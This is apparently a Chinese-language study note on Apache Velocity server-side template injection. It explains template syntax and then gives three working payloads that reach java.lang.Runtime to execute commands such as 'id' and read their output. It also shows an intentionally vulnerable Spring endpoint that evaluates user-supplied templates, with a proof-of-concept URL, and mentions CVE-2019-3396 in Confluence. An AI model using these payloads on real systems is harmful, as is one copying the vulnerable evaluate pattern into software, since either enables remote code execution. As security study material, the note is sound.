---
comments: true
---
# Velocity 模板注入

[Apache Velocity](https://velocity.apache.org/engine/devel/user-guide.html){target="_blank"}是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象，允许web 页面设计者引用JAVA代码预定义的方法

## 基本语法

**标识符**

\#用来标识Velocity的脚本语句，包括`#set`、`#if` 、`#else`、`#end`、`#foreach`、`#end`、`#include`、`#parse`、`#macro`等语句。

\$用来标识变量

{} 用来明确标识Velocity变量，例如 `someone` 为变量名，而页面中出现了 `$someonename` ，需要用 `{}` 包裹，即 `${someone}name`

"!"用来强制把不存在的变量显示为空白。如：`$!msg` 将在msg不存在时显示为空白，而不是显示 `$msg`

**定义变量**

\#set(\$varname = value)

**注释**

单行注释为`##`，多行注释以`#*`开始，以`*#`结束

**条件判断**

`#if`、`#elseif`、`#else`、`#end`

**单双引号**

单引号不解析引用内容，双引号解析引用内容

```velocity
#set ($var="aaaaa")
'$var'  ## 结果为：$var
"$var"  ## 结果为：aaaaa
```

**命令执行**
```velocity 
// 命令执行1
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("open -a Calculator")

// 命令执行2 
#set($x='')##
#set($rt = $x.class.forName('java.lang.Runtime'))##
#set($chr = $x.class.forName('java.lang.Character'))##
#set($str = $x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

// 命令执行3
#set ($e="exp")
#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\A"))
#if($scan.hasNext())
$scan.next()
#end
```

**Velocity的使用流程**

- 初始化Velocity模板引擎，包括模板路径、加载类型等
- 创建用于存储预传递到模板文件的数据的上下文
- 选择具体的模板文件，传递数据完成渲染

## 漏洞复现

### java-sec-code
```java
import org.apache.velocity.VelocityContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import org.apache.velocity.app.Velocity;

import java.io.StringWriter;

@RestController
@RequestMapping("/ssti")
public class SSTI {

    /**
     * SSTI of Java velocity. The latest Velocity version still has this problem.
     * Fix method: Avoid to use Velocity.evaluate method.
     * <p>
     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)
     * Open a calculator in MacOS.
     *
     * @param template exp
     */
    @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}
```

直接利用上面的命令执行 PoC 即可

### CVE-2019-3396

Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。

!!! tips "影响版本"

    - <= 6.6.11
    - 6.7.0 -- 6.12.2
    - 6.13.0 -- 6.13.2
    - 6.14.0 -- 6.14.2

Todo

笔记本内存不够复现跑不起来，之后回学校台式机再搞 o.O

## 参考资料

-[CVE-2019-3396 Confluence Velocity SSTI漏洞浅析](https://xz.aliyun.com/t/8135){target="_blank"}
-[白头搔更短，SSTI惹人心！](https://xz.aliyun.com/t/7466){target="_blank"}